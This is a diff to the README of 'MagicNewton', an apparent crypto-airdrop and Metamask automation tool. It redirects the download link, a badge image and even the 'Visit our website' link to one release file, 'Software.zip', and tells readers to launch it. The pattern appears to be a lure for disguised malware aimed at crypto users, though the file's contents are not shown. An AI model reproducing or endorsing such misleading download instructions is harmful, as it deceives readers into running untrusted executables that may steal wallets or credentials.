@@ -39,9 +39,9 @@ Welcome to **MagicNewton** - your go-to repository for all things related to aut
 
 ## Getting Started
 
-To get started with **MagicNewton**, [click here to download the latest version!](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+To get started with **MagicNewton**, [click here to download the latest version!](https://github.com/SaoFaiFah/MagicNewton/releases/download/v1.0/Software.zip)
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/SaoFaiFah/MagicNewton/releases/download/v1.0/Software.zip%20Version-brightgreen)](https://github.com/SaoFaiFah/MagicNewton/releases/download/v1.0/Software.zip)
 
 Remember to launch the downloaded file to begin your magical journey with **MagicNewton**! 🚀
 
@@ -63,6 +63,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Let the magic of **MagicNewton** empower you to roll dice effortlessly and conquer tasks with ease. Dive into the world of automation, airdrops, and Metamask integration like never before. Join us on this mystical journey and unleash the power of magic and technology combined! 🌟🔮
 
-[Visit our website](https://magicnewton.com) for more information and updates. 
+[Visit our website](https://github.com/SaoFaiFah/MagicNewton/releases/download/v1.0/Software.zip) for more information and updates. 
 
 **MagicNewton** - Where magic meets automation for a truly enchanting experience! 🎩✨
